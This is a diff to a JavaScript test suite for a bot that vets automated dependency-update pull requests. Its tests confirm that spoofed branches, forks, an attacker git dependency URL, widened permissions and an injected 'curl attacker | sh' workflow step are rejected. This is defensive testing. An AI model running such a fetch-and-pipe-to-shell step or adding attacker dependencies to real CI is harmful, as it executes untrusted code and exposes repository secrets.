@@ -51,7 +51,7 @@ const pkg = {
 };
 const updatedPkg = () => {
   const updated = clone(pkg);
-  updated.dependencies["@openai/codex-sdk"] = "0.161.0";
+  updated.dependencies.dotenv = "^18.0.5";
   return updated;
 };
 const lock = (manifest) => ({
@@ -72,10 +72,10 @@ const lock = (manifest) => ({
   },
 });
 const workflow =
-  "name: CI\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@v6\n      - run: npm test\n";
+  "name: CI\npermissions:\n  contents: read\njobs:\n  test:\n    steps:\n      - uses: actions/checkout@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - run: npm test\n";
 function fixture() {
   const data = {
-    snapshot: pr(),
+    snapshot: pr(dependabot, "dependabot/npm_and_yarn/dependencies"),
     latest: null,
     checks: checks(),
     statuses: [],
@@ -93,7 +93,7 @@ function fixture() {
       head: {
         "package.json": JSON.stringify(updatedPkg()),
         "package-lock.json": JSON.stringify(lock(updatedPkg())),
-        ".github/workflows/ci.yml": workflow.replace("@v6", "@v7"),
+        ".github/workflows/ci.yml": workflow.replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
       },
     },
   };
@@ -184,7 +184,7 @@ test("spoofed branch, fork, draft and different base fail before inspecting cand
       p.user = { login: "attacker", id: 123, type: "User" };
     },
     (p) => {
-      p.head.ref = "dependabot/npm_and_yarn/spoof";
+      p.head.ref = "automation/update-codex-packages";
     },
     (p) => {
       p.head.repo = { id: 777, full_name: "attacker/codex-telegram-bot" };
@@ -223,20 +223,20 @@ test("scripts, permissions, workflow commands and unrelated dependencies require
   const remote = updatedPkg();
   remote.dependencies["@openai/codex-sdk"] = "git+https://attacker/pkg.git";
   assert.equal(manifestAllowed(pkg, remote, "codex"), false);
-  assert.equal(actionRefsOnly(workflow, workflow.replace("@v6", "@v7")), true);
+  assert.equal(actionRefsOnly(workflow, workflow.replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb")), true);
   assert.equal(
     actionRefsOnly(
       workflow,
       workflow
         .replace("contents: read", "contents: write")
-        .replace("@v6", "@v7"),
+        .replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
     ),
     false,
   );
   assert.equal(
     actionRefsOnly(
       workflow,
-      workflow.replace("npm test", "curl attacker | sh").replace("@v6", "@v7"),
+      workflow.replace("npm test", "curl attacker | sh").replace("@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "@bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"),
     ),
     false,
   );
